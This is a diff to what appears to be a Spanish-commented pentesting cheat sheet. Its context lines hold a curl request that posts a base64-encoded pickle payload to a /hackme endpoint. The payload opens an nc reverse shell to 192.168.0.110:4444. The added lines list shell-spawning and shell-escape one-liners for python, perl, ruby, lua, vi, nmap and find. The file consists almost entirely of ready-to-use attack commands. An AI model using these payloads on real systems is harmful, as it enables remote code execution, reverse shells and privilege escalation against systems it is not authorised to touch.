@@ -13,3 +13,18 @@ for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print
 
 # PROXY CON CURL
 curl -x "http://127.0.0.1:8080" -d "pickled=gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxOTIuMTY4LjAuMTEwIDQ0NDQgPiAvdG1wL2aUhZRSlC4=" http://127.0.0.1:5000/hackme
+
+
+# SPAWNING TTY
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+echo os.system(‘/bin/bash’)
+/bin/sh -i
+perl -e ‘exec “/bin/sh”;’
+perl: exec “/bin/sh”;
+ruby: exec “/bin/sh”
+lua: os.execute(‘/bin/sh’)
+exec “/bin/sh” (Desde IRB)
+:!bash (Desde vi)
+:set shell=/bin/bash:shell (Desde vi)
+!sh (Desde nmap)
+find /etc/passwd -exec /bin/bash \;
